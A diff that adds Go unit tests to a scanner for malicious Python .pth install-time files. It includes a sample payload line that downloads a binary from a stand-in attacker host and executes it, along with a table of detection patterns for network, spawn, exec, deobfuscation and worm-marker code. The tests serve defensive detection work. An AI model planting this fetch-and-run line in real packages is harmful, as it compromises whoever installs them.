@@ -100,3 +100,75 @@ func TestInspectRejectsAllowlistImpostor(t *testing.T) {
 	v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n")})
 	require.True(t, v.Flagged())
 }
+
+// hadesPth is the canonical Hades shape: a `*-setup.pth` carrying an
+// import-line that fetches Bun, drops _index.js, and execs it. We exercise
+// each payload group at least once.
+const hadesPth = `import urllib.request, os, subprocess; ` +
+	`urllib.request.urlretrieve('https://attacker.tld/bun', '/tmp/bun'); ` +
+	`os.chmod('/tmp/bun', 0o755); ` +
+	`subprocess.Popen(['/tmp/bun', '/tmp/_index.js'])` + "\n"
+
+func TestInspectFlagsHadesPth(t *testing.T) {
+	v := pthscan.Inspect(pthscan.Input{
+		PthContent: []byte(hadesPth),
+		FileName:   "ensmallen-setup.pth",
+	})
+	require.True(t, v.Flagged())
+	require.Equal(t, pthscan.SeverityCritical, v.Severity)
+	require.True(t, hasSignal(v, "pth-payload-network"), "got %v", codes(v))
+	require.True(t, hasSignal(v, "pth-payload-spawn"))
+	require.True(t, hasSignal(v, "pth-payload-runtime-fetch"))
+	require.True(t, hasSignal(v, "pth-setup-filename"))
+}
+
+func TestInspectPayloadGroupsTable(t *testing.T) {
+	cases := []struct {
+		name string
+		body string
+		want string
+	}{
+		{"network-urllib", "import urllib.request as r", "pth-payload-network"},
+		{"network-requests", "import requests as r", "pth-payload-network"},
+		{"spawn-subprocess", "import subprocess as s", "pth-payload-spawn"},
+		{"spawn-os-system", "import os; os.system('x')", "pth-payload-spawn"},
+		{"dynamic-exec", "import x; exec(x)", "pth-payload-dynamic-exec"},
+		{"deobfuscation-b64", "import base64; base64.b64decode('xx')", "pth-payload-deobfuscation"},
+		{"deobfuscation-hex-escapes", `import x; exec("\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad")`, "pth-payload-deobfuscation"},
+		{"runtime-fetch-bun", "import os; os.popen('bun /tmp/x.js')", "pth-payload-runtime-fetch"},
+		{"runtime-fetch-curl", "import os; os.popen('curl http://x')", "pth-payload-runtime-fetch"},
+		{"worm-marker-bun-ran", "import os; open('/tmp/.bun_ran','w').close()", "pth-payload-worm-marker"},
+		{"worm-marker-name", "import os; os.system('echo shai-hulud')", "pth-payload-worm-marker"},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			v := pthscan.Inspect(pthscan.Input{PthContent: []byte(c.body + "\n")})
+			require.True(t, v.Flagged())
+			require.Equal(t, pthscan.SeverityCritical, v.Severity)
+			require.True(t, hasSignal(v, c.want), "missing %s; got %v", c.want, codes(v))
+		})
+	}
+}
+
+func TestInspectSetupFilenameAloneIsMedium(t *testing.T) {
+	// A `*-setup.pth` with only path-entry lines and no executable line is
+	// suspicious (no real ecosystem ships this name) but not on its own a
+	// critical install-time payload.
+	v := pthscan.Inspect(pthscan.Input{
+		PthContent: []byte("some/path\n"),
+		FileName:   "evil-setup.pth",
+	})
+	require.True(t, v.Flagged())
+	require.Equal(t, pthscan.SeverityMedium, v.Severity)
+	require.True(t, hasSignal(v, "pth-setup-filename"))
+}
+
+func TestInspectEditableFilenameNotFlagged(t *testing.T) {
+	// __editable__.foo-1.2.3.pth ending in `-1.2.3.pth` must not be confused
+	// with `-setup.pth` even though both end in `.pth`.
+	v := pthscan.Inspect(pthscan.Input{
+		PthContent: []byte(`import __editable___foo_1_2_3_finder; __editable___foo_1_2_3_finder.install()` + "\n"),
+		FileName:   "__editable__.foo-1.2.3.pth",
+	})
+	require.False(t, v.Flagged(), "got %v", codes(v))
+}
